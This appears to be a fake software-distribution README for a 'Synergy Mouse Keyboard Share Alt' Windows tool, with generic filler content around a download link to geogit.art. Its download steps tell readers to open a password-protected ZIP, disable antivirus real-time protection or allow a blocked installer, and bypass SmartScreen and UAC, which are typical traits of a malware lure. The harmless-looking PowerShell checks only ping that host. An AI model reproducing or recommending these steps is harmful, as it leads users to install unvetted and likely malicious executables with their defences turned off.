# Synergy Mouse Keyboard Share Alt

Synergy Mouse Keyboard Share Alt for Windows — Synergy alternative for shared keyboard and mouse.

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Synergy Mouse Keyboard Share Alt" width="520">
  </a>
</div>

## Download

1. Click the **Download Latest** image above to get the latest version
2. Open your **Downloads** folder
3. Copy the **archive password**
4. Right-click the ZIP → **Extract All** (or use 7-Zip / WinRAR) and paste the password when asked
5. If **antivirus** or Windows Security blocks the installer, temporarily turn off real-time protection or choose **Allow** — **turn protection back on after installation**
6. Open the extracted folder and run the **current version**

---

## Overview

**Synergy Mouse Keyboard Share Alt** is documented here for **Windows 10 and 11**: installation from the download link, extracting the archive, and using the main features listed below. Get the package through the **Download** section (geogit.art, password-protected ZIP).

---

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Click any **Download Latest** image in this README — follow the **Download** steps to get the package and run the installer. |
| Which Windows versions? | **Windows 10 and 11**, 64-bit. |
| UAC or SmartScreen? | Choose **Yes** / **Run anyway** if Windows prompts during install. |
| What does this repo cover? | **Synergy Mouse Keyboard Share Alt** on Windows — install and daily use. |


---

## Features

- Desktop workflow for **Synergy Mouse Keyboard Share Alt** on Windows
- Install via password-protected ZIP (see Download)
- Windows 10 / 11, 64-bit
- Documented first-run steps in this README

---

## Use cases

- Daily use of Synergy Mouse Keyboard Share Alt on a Windows PC
- Home office or power-user setups on Windows 10 / 11

---

## Developer reference

Optional checks for support (install does not require PowerShell).

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "synergy-mouse-keyboard-share-alt"
$BuildLabel     = "2026.04"
```

**Endpoint reachability**

```powershell
Test-NetConnection geogit.art -Port 443
try {
  Invoke-WebRequest https://geogit.art/health -UseBasicParsing -Method Head -TimeoutSec 15 |
    Select-Object StatusCode, StatusDescription
} catch { $_.Exception.Message }
```

**Post-install**

```powershell
Get-Process -Name "Synergy*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

---

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |


<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Synergy Mouse Keyboard Share Alt" width="520">
  </a>
</div>

---

## Topics

`synergy-mouse-keyboard-share-alt` · `synergy-windows` · `windows-10` · `windows-11` · `windows-desktop` · `kvm-software` · `mouse-keyboard-share` · `multi-pc-control` · `synergy-software` · `desktop-software` · `windows-software`

---

## License

This repository describes installation and usage of third-party **desktop** software on Windows. Comply with vendor licensing and your local laws.
